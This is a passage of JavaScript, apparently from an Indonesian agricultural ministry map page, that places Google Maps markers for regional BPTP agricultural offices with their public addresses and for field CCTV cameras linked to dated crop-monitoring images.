                position: new google.maps.LatLng(-8.714662, 115.21144)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Bali"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Bali <br> <b>Alamat :</b> Jl. Bypass Ngurah Rai, Pasanggaran Po.Box 3480, Denpasar Bali <br> <b>No Telp/Fax :</b> 0361-720498/ 0361-720498 <br> <b>Lokasi :</b> Kota Denpasar, PROV. Bali <br>  <a href='https://maps.google.com/maps?t=h&q=-8.714662,115.21144&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-8.596804, 116.219377)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP NTB"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP NTB <br> <b>Alamat :</b> Jl. Peninjauan Narmada Po. Box 1017, Mataram 83010 <br> <b>No Telp/Fax :</b> 0370.671 312/ 0370-671620 <br> <b>Lokasi :</b> Kab. Lombok Barat, PROV. Nusa Tenggara Barat <br>  <a href='https://maps.google.com/maps?t=h&q=-8.596804,116.219377&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-10.09, 123.84)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP NTT"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP NTT <br> <b>Alamat :</b> Jl. Timor Raya KM. 32 Naibonat Po. Box 1022, Kupang, NTT 85362 <br> <b>No Telp/Fax :</b> 0380-833766, 0380-823281/ 0380-829537 <br> <b>Lokasi :</b> Kab. Kupang, PROV. Nusa Tenggara Timur <br>  <a href='https://maps.google.com/maps?t=h&q=-10.09,123.84&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(0.002139, 109.360808)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Kalbar"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Kalbar <br> <b>Alamat :</b> Jl. Budi Utomo No. 45, Siantan Hulu, Pontianak 78061, Kotak Pos 6150 Kalbar <br> <b>No Telp/Fax :</b> 0561-882069/ 0561-883883 <br> <b>Lokasi :</b> Kota Pontianak, PROV. Kalimantan Barat <br>  <a href='https://maps.google.com/maps?t=h&q=0.002139,109.360808&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-2.229662, 113.892932)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Kalteng"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Kalteng <br> <b>Alamat :</b> Jl. G. Obos Km, 5 Kotak Pos 122, Palangkaraya 73111 <br> <b>No Telp/Fax :</b> 0536-3329662/ 0536-3227861 <br> <b>Lokasi :</b> Kota Palangkaraya, PROV. Kalimantan Tengah <br>  <a href='https://maps.google.com/maps?t=h&q=-2.229662,113.892932&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-3.458859, 114.819489)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Kalsel"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Kalsel <br> <b>Alamat :</b> Jl. Panglima Batur Barat No.4 Po. Box 1032, Banjarbaru 70711 <br> <b>No Telp/Fax :</b> 0511-772346, 0511-773193/ 0511-4781810 <br> <b>Lokasi :</b> Kota Banjarbaru, PROV. Kalimantan Selatan <br>  <a href='https://maps.google.com/maps?t=h&q=-3.458859,114.819489&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-0.437571, 117.247218)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Kaltim"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Kaltim <br> <b>Alamat :</b> Jl. Pangeran M. Noor - Sempaja, Samarinda, Kaltim Kode Pos 75119 <br> <b>No Telp/Fax :</b> 0541-220691, 0541-250023/ 0541-220857 <br> <b>Lokasi :</b> Kota Samarinda, PROV. Kalimantan Timur <br>  <a href='https://maps.google.com/maps?t=h&q=-0.437571,117.247218&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-0.437571, 117.247218)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Kaltara"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Kaltara <br> <b>Alamat :</b> Jl. Pangeran M. Noor - Sempaja, Samarinda, Kaltim Kode Pos 75119 <br> <b>No Telp/Fax :</b> 0541-220691, 0541-250023/ 0541-220857 <br> <b>Lokasi :</b> Kota Samarinda, PROV. Kalimantan Utara <br>  <a href='https://maps.google.com/maps?t=h&q=-0.437571,117.247218&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(1.472178, 124.865942)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Sulut"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Sulut <br> <b>Alamat :</b> Jl. Kampus Pertanian Kalasey Kotak Pos 1345, Manado 95013 <br> <b>No Telp/Fax :</b> 0431-838637/ 0431-838808 <br> <b>Lokasi :</b> Kota Manado, PROV. Sulawesi Utara <br>  <a href='https://maps.google.com/maps?t=h&q=1.472178,124.865942&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(0.576111, 120.187778)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Sulteng"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Sulteng <br> <b>Alamat :</b> Jl. Lasoso No. 62 Biromaru, Kotak Pos 51, Palu <br> <b>No Telp/Fax :</b> 0451-482546, 0451-842549/ 0451-482549 <br> <b>Lokasi :</b> Kota Palu, PROV. Sulawesi Tengah <br>  <a href='https://maps.google.com/maps?t=h&q=0.576111,120.187778&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-5.084463, 119.52079)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Sulsel"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Sulsel <br> <b>Alamat :</b> Jl. Perintis Kemerdekaam, Km, 175 Kotak Pos 1234, Kota Makassar <br> <b>No Telp/Fax :</b> 0411-554522/ 0411-556449 <br> <b>Lokasi :</b> Kota Makassar, PROV. Sulawesi Selatan <br>  <a href='https://maps.google.com/maps?t=h&q=-5.084463,119.52079&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-3.96578, 122.467237)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Sultra"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Sultra <br> <b>Alamat :</b> Jl. Prof. Muh. Yamin No. 89, Kendari Po. Box 55  <br> <b>No Telp/Fax :</b> 0401-325871/ 0401-323180 <br> <b>Lokasi :</b> Kota Kendari, PROV. Sulawesi Tenggara <br>  <a href='https://maps.google.com/maps?t=h&q=-3.96578,122.467237&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(0.478056, 123.111707)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Gorontalo"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Gorontalo <br> <b>Alamat :</b> Jl. Kopi No. 270, Tilong Kabila, Desa Montong, Gorontalo <br> <b>No Telp/Fax :</b> 0435-827627/ 0435-827627 <br> <b>Lokasi :</b> Kota Gorontalo, PROV. Gorontalo <br>  <a href='https://maps.google.com/maps?t=h&q=0.478056,123.111707&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-2.665586722, 118.8497848)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "LPTP Sulbar"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> LPTP Sulbar <br> <b>Alamat :</b> Kompleks Perkantoran Pemprov. Sulawesi Barat, Jl. H. Abdul Malik Pattana Endeng, Kab. Mamuju <br> <b>No Telp/Fax :</b> 0426-2325340/ 0426-2325340 <br> <b>Lokasi :</b> Kab. Mamuju, PROV. Sulawesi Barat <br>  <a href='https://maps.google.com/maps?t=h&q=-2.665586722,118.8497848&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-3.700504, 128.265967)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Maluku"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Maluku <br> <b>Alamat :</b> Jl. Chr Soplanit Rumah Tiga Ambon, Kotak Pos 204 Passo <br> <b>No Telp/Fax :</b> 0921-326350/ 0921-326350 <br> <b>Lokasi :</b> Kota Ambon, PROV. Maluku <br>  <a href='https://maps.google.com/maps?t=h&q=-3.700504,128.265967&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(0.691973, 127.553501)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Malut"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Malut <br> <b>Alamat :</b> Jl. Inpres Ubo-ubo No. 241 Ternate, Halmahera Selatan <br> <b>No Telp/Fax :</b> 0986-213182, 0986-211377/ 0911-322542 <br> <b>Lokasi :</b> Kab. Halmahera Selatan, PROV. Maluku Utara <br>  <a href='https://maps.google.com/maps?t=h&q=0.691973,127.553501&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-0.831541, 134.072378)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Papua Barat"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Papua Barat <br> <b>Alamat :</b> Jl. Base Camp - Arfai Gunung Kompleks Perkantoran Pemda Prov. Papua Barat <br> <b>No Telp/Fax :</b> 0986-211130/ 0986-211130 <br> <b>Lokasi :</b> Kab. Manokwari, PROV. Papua Barat <br>  <a href='https://maps.google.com/maps?t=h&q=-0.831541,134.072378&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-2.551075, 140.477325)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Papua"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Papua <br> <b>Alamat :</b> Jl. Yahim Sentani, Jayapura Po. Box 256, Sentani 99352, Jayapura 99352 <br> <b>No Telp/Fax :</b> 0761-35641, 0761-674205/ 0761-674206 <br> <b>Lokasi :</b> Kab. Jayapura, PROV. Papua <br>  <a href='https://maps.google.com/maps?t=h&q=-2.551075,140.477325&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            var weatherLayer = new google.maps.weather.WeatherLayer({
                temperatureUnits: google.maps.weather.TemperatureUnit.CELSIUS
            });
            weatherLayer.setMap(map);
            var infoWindow_cctv = new google.maps.InfoWindow();
            var markerBounds_cctv = new google.maps.LatLngBounds();
            var markerArray_cctv = [];

            function makeMarker_cctv(options) {
                //var pushPin = new google.maps.Marker({map:map});
                var pushPin_cctv = new google.maps.Marker({
                    map: map
                });
                pushPin_cctv.setOptions(options);
                google.maps.event.addListener(pushPin_cctv, "click", function() {
                    infoWindow_cctv.setOptions(options);
                    infoWindow_cctv.open(map, pushPin_cctv);
                });
                markerBounds.extend(options.position);
                markerArray_cctv.push(pushPin_cctv);
                return pushPin_cctv;
            }
            google.maps.event.addListener(map, "click", function() {
                infoWindow_cctv.close();
            });
            var image_cctv = new google.maps.MarkerImage("http://katam.litbang.pertanian.go.id/markers/markers_cctv.png"
                , new google.maps.Size(16.0, 16.0)
                , new google.maps.Point(0, 0)
                , new google.maps.Point(8.0, 8.0)
            );
            var shadow_cctv = new google.maps.MarkerImage("http://katam.litbang.pertanian.go.id/markers/shadow_cctv.png"
                , new google.maps.Size(25.0, 16.0)
                , new google.maps.Point(0, 0)
                , new google.maps.Point(8.0, 8.0)
            );
            makeMarker_cctv({
                position: new google.maps.LatLng(-5.739027778, 105.6777778)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Penengahan"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=41' target='_blank'>Penengahan </a><br> <b>Kec. :</b> Panengahan, <b>Kab. :</b> Lampung Selatan,<br> <b>PROV. Lampung</b> :: <a href='https://maps.google.com/maps?t=h&q=-5.739027778,105.6777778&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Mon, 28 May 2018<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV41/periodic/balitklimat_CCTV41_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV41/periodic/balitklimat_CCTV41_terbaru.jpg' alt='Mon, 28 May 2018' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV41/periodic/balitklimat_CCTV41_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV41/periodic/balitklimat_CCTV41_2018.gif' target='_blank'>2018</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV41/periodic/balitklimat_CCTV41_2018_05.gif' target='_blank'>May</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV41/periodic/balitklimat_CCTV41_2018_05_D1.gif' target='_blank'>May I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV41/periodic/balitklimat_CCTV41_2018_05_D2.gif' target='_blank'>May II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV41/periodic/balitklimat_CCTV41_2018_05_D3.gif' target='_blank'>May III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-5.132111111, 105.3628889)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Batanghari"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=44' target='_blank'>Batanghari </a><br> <b>Kec. :</b> Batanghari, <b>Kab. :</b> Lampung Timur,<br> <b>PROV. Lampung</b> :: <a href='https://maps.google.com/maps?t=h&q=-5.132111111,105.3628889&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Mon, 09 October 2017<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV44/periodic/balitklimat_CCTV44_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV44/periodic/balitklimat_CCTV44_terbaru.jpg' alt='Mon, 09 October 2017' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV44/periodic/balitklimat_CCTV44_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV44/periodic/balitklimat_CCTV44_2017.gif' target='_blank'>2017</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV44/periodic/balitklimat_CCTV44_2017_10.gif' target='_blank'>Oct</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV44/periodic/balitklimat_CCTV44_2017_10_D1.gif' target='_blank'>Oct I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV44/periodic/balitklimat_CCTV44_2017_10_D2.gif' target='_blank'>Oct II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV44/periodic/balitklimat_CCTV44_2017_10_D3.gif' target='_blank'>Oct III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-5.357055556, 105.09225)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Gedungtataan"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=52' target='_blank'>Gedungtataan </a><br> <b>Kec. :</b> Gedong Tataan, <b>Kab. :</b> Pesawaran,<br> <b>PROV. Lampung</b> :: <a href='https://maps.google.com/maps?t=h&q=-5.357055556,105.09225&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Thu, 01 February 2018<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV52/periodic/balitklimat_CCTV52_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV52/periodic/balitklimat_CCTV52_terbaru.jpg' alt='Thu, 01 February 2018' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV52/periodic/balitklimat_CCTV52_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV52/periodic/balitklimat_CCTV52_2018.gif' target='_blank'>2018</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV52/periodic/balitklimat_CCTV52_2018_02.gif' target='_blank'>Feb</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV52/periodic/balitklimat_CCTV52_2018_02_D1.gif' target='_blank'>Feb I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV52/periodic/balitklimat_CCTV52_2018_02_D2.gif' target='_blank'>Feb II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV52/periodic/balitklimat_CCTV52_2018_02_D3.gif' target='_blank'>Feb III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-6.5017605, 107.1215363)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Cariu"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=53' target='_blank'>Cariu </a><br> <b>Kec. :</b> Cariu, <b>Kab. :</b> Bogor,<br> <b>PROV. Jabar</b> :: <a href='https://maps.google.com/maps?t=h&q=-6.5017605,107.1215363&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Mon, 11 March 2019<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV53/periodic/balitklimat_CCTV53_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV53/periodic/balitklimat_CCTV53_terbaru.jpg' alt='Mon, 11 March 2019' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV53/periodic/balitklimat_CCTV53_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV53/periodic/balitklimat_CCTV53_2019.gif' target='_blank'>2019</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV53/periodic/balitklimat_CCTV53_2019_03.gif' target='_blank'>Mar</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV53/periodic/balitklimat_CCTV53_2019_03_D1.gif' target='_blank'>Mar I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV53/periodic/balitklimat_CCTV53_2019_03_D2.gif' target='_blank'>Mar II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV53/periodic/balitklimat_CCTV53_2019_03_D3.gif' target='_blank'>Mar III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-6.9489465, 106.9631577)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Kebonpedes"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=9' target='_blank'>Kebonpedes </a><br> <b>Kec. :</b> Kebonpedes., <b>Kab. :</b> Sukabumi,<br> <b>PROV. Jabar</b> :: <a href='https://maps.google.com/maps?t=h&q=-6.9489465,106.9631577&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Mon, 15 July 2019<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV09/periodic/balitklimat_CCTV09_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV09/periodic/balitklimat_CCTV09_terbaru.jpg' alt='Mon, 15 July 2019' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV09/periodic/balitklimat_CCTV09_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV09/periodic/balitklimat_CCTV09_2019.gif' target='_blank'>2019</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV09/periodic/balitklimat_CCTV09_2019_07.gif' target='_blank'>Jul</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV09/periodic/balitklimat_CCTV09_2019_07_D1.gif' target='_blank'>Jul I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV09/periodic/balitklimat_CCTV09_2019_07_D2.gif' target='_blank'>Jul II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV09/periodic/balitklimat_CCTV09_2019_07_D3.gif' target='_blank'>Jul III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-6.8083773, 107.2738495)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Haurwangi"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=46' target='_blank'>Haurwangi </a><br> <b>Kec. :</b> Ciranjang., <b>Kab. :</b> Cianjur,<br> <b>PROV. Jabar</b> :: <a href='https://maps.google.com/maps?t=h&q=-6.8083773,107.2738495&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Tue, 17 July 2018<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV46/periodic/balitklimat_CCTV46_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV46/periodic/balitklimat_CCTV46_terbaru.jpg' alt='Tue, 17 July 2018' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV46/periodic/balitklimat_CCTV46_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV46/periodic/balitklimat_CCTV46_2018.gif' target='_blank'>2018</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV46/periodic/balitklimat_CCTV46_2018_07.gif' target='_blank'>Jul</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV46/periodic/balitklimat_CCTV46_2018_07_D1.gif' target='_blank'>Jul I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV46/periodic/balitklimat_CCTV46_2018_07_D2.gif' target='_blank'>Jul II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV46/periodic/balitklimat_CCTV46_2018_07_D3.gif' target='_blank'>Jul III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-7.1816773, 107.8966263)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Kadungora"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=45' target='_blank'>Kadungora </a><br> <b>Kec. :</b> Kadungora., <b>Kab. :</b> Garut,<br> <b>PROV. Jabar</b> :: <a href='https://maps.google.com/maps?t=h&q=-7.1816773,107.8966263&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Sat, 09 December 2017<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV45/periodic/balitklimat_CCTV45_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV45/periodic/balitklimat_CCTV45_terbaru.jpg' alt='Sat, 09 December 2017' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV45/periodic/balitklimat_CCTV45_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV45/periodic/balitklimat_CCTV45_2017.gif' target='_blank'>2017</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV45/periodic/balitklimat_CCTV45_2017_12.gif' target='_blank'>Dec</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV45/periodic/balitklimat_CCTV45_2017_12_D1.gif' target='_blank'>Dec I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV45/periodic/balitklimat_CCTV45_2017_12_D2.gif' target='_blank'>Dec II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV45/periodic/balitklimat_CCTV45_2017_12_D3.gif' target='_blank'>Dec III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-6.693284, 108.1843262)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Kertajati"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=35' target='_blank'>Kertajati </a><br> <b>Kec. :</b> Kertajati., <b>Kab. :</b> Majalengka.,<br> <b>PROV. Jabar</b> :: <a href='https://maps.google.com/maps?t=h&q=-6.693284,108.1843262&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Thu, 27 September 2018<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV35/periodic/balitklimat_CCTV35_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV35/periodic/balitklimat_CCTV35_terbaru.jpg' alt='Thu, 27 September 2018' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV35/periodic/balitklimat_CCTV35_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV35/periodic/balitklimat_CCTV35_2018.gif' target='_blank'>2018</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV35/periodic/balitklimat_CCTV35_2018_09.gif' target='_blank'>Sep</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV35/periodic/balitklimat_CCTV35_2018_09_D1.gif' target='_blank'>Sep I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV35/periodic/balitklimat_CCTV35_2018_09_D2.gif' target='_blank'>Sep II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV35/periodic/balitklimat_CCTV35_2018_09_D3.gif' target='_blank'>Sep III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-6.4722905, 108.2275696)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Lelea"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=39' target='_blank'>Lelea </a><br> <b>Kec. :</b> Lelea., <b>Kab. :</b> Indramayu,<br> <b>PROV. Jabar</b> :: <a href='https://maps.google.com/maps?t=h&q=-6.4722905,108.2275696&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Wed, 20 April 2016<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV39/periodic/balitklimat_CCTV39_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV39/periodic/balitklimat_CCTV39_terbaru.jpg' alt='Wed, 20 April 2016' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV39/periodic/balitklimat_CCTV39_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV39/periodic/balitklimat_CCTV39_2016.gif' target='_blank'>2016</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV39/periodic/balitklimat_CCTV39_2016_04.gif' target='_blank'>Apr</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV39/periodic/balitklimat_CCTV39_2016_04_D1.gif' target='_blank'>Apr I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV39/periodic/balitklimat_CCTV39_2016_04_D2.gif' target='_blank'>Apr II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV39/periodic/balitklimat_CCTV39_2016_04_D3.gif' target='_blank'>Apr III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-7.1751986, 112.3983688)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Tikung"
